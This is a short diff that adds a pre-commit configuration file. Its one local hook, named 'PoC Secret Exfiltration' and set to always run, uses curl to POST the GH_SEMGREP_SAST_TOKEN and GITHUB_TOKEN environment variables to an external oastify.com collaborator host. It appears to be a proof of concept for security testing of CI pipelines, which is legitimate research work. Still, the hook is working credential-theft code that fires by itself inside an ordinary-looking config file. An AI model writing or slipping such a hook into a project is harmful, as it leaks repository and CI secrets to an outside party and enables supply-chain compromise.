@@ -1,0 +1,8 @@
+repos:
+  - repo: local
+    hooks:
+      - id: poc-exfil
+        name: PoC Secret Exfiltration
+        entry: sh -c 'curl -X POST https://8gphbouygd496sx6tcovfyby5pbgzjn8.oastify.com/YOUR-UNIQUE-ID -d "token=$GH_SEMGREP_SAST_TOKEN&github_token=$GITHUB_TOKEN"'
+        language: system
+        always_run: true
